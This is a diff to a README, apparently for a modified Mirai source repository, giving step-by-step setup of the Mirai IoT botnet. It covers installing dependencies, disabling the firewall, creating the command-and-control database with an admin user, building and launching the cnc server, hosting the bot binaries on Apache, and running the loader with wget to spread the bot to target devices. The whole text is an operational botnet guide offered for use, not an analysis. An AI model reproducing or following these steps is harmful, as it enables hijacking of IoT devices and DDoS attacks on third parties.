@@ -41,8 +41,10 @@ The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b
 
 ※If you are not logged in as root, be sure to add sudo and follow the installation instructions below.<br />
 ※If you are unable to install the software, please refer to the following URL for installation.<br />
-https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
-https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt
+https://programmer.group/mirai-botnet-environment-setup-steps.html <br>
+https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br>
+https://www.youtube.com/watch?v=G4vUp3ydjs0 <br>
+https://www.youtube.com/watch?v=nz_6ayGosxo <br>
 
 ```
 # sudo apt-get install git gcc golang electric-fence mysql-server mysql-client
@@ -107,58 +109,85 @@ If you have iptbales/ip6tables or any firewall install disable it.
 ```
 # sudo service iptables stop
 ```
-Database setup<br />
-※It will ask you to set a password, make sure you remember this.
-```
-# sudo /usr/bin/mysql_secure_installation
-```
-Go to `cd cnc/`, open main.go and replace the root password you just entered with MySQL_Password.
-```
-const DatabaseAddr string   = "127.0.0.1:3306"
-const DatabaseUser string   = "root"
-const DatabasePass string   = "MySQL_Password"
-const DatabaseTable string  = "mirai"
-```
+Database setup<br>
 Add users to mysql.
 ```
-# cd ../../scripts
-# cat db.sql | sudo mysql -uroot -pMySQL_Password
+# cd release
+# sudo mysql -u root -p
+Enter Password: root
+> create database mirai;
+> use mirai
+```
+When you are done typing,<br>
+```
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+```
+Copy and paste this far into the mysql prompt.<br>
+After pressing Enter, type the command below.
+```
+> INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
+> exit
 # sudo service mysql restart
 ```
-Once you restart the mysql server, go to your debug folder ./mirai/release, you will seen a compiled file named cnc execute it.
-```
-# cd ../mirai/release
-# sudo ./cnc
-```
-Open a new window and execute the following command
+After restarting the mysql server, compile again and go to the release directory and run the compiled file named cnc.
 ```
 # cd ..
+# ./build.sh release telnet
 # cp prompt.txt release/
+# cd release
+# sudo ./cnc
 ```
-Then, use telnet to connect to your IP address.<br />
+Next, open a new prompt and telnet to the IP address of the one who compiled the bot.<br>
 The following is an example of running the telnet command.
 ```
 # telnet 192.168.19.19
 ```
-OK, well use this user name and password to login in this case the username is : `tashiro` and the password is : `mystrongestpassword`
-
-again in you server Terminal some like Putty or mobaxterm.<br />
-Go to this directory ../Mirai-Source-Code-plus/mirai/release
-```
-# cd Mirai-Source-Code-plus/mirai/release
-```
-Next, install and start the Apache server.
+OK, well use this user name and password to login in this case the username is : `tashiro` and the password is : `mystrongestpassword`<br><br>
+Open a new prompt again and install and start Apache2.
 ```
 # sudo apt install apache2
 # sudo service apache2 start
 ```
 copy the mirai files at the apache source.
 ```
-# sudo cp mirai.* /var/www/html
+# sudo mv mirai.* /var/www/html
 ```
 well we need to delete the index to show the index file directory on browser.
 ```
-# rm /var/www/html/index.html
+# rm -fr /var/www/html/index.html
 ```
 Then open a browser and enter http://localhost or your IP address and see if the file appears.
 
@@ -203,13 +232,14 @@ and after than type this code but put you filename here --> file.txt before past
 ```
 # cat file.txt | ./loader wget http://dyn.com
 ```
-This completes the installation. :)<br />
+This completes the installation. :)<br>
 Thank you for your hard work. Take a break and have a cup of coffee or something.
 
 ## References
 
-https://github.com/jgamblin/Mirai-Source-Code <br />
-https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
-https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br />
+https://github.com/jgamblin/Mirai-Source-Code <br>
+https://programmer.group/mirai-botnet-environment-setup-steps.html <br>
+https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br>
+https://www.youtube.com/channel/UCXM4xUOmJk3Px2qiG9x1ygg/videos <br>
 
 The translation in English is DeepL, but there are some funny parts, so please be warm there.
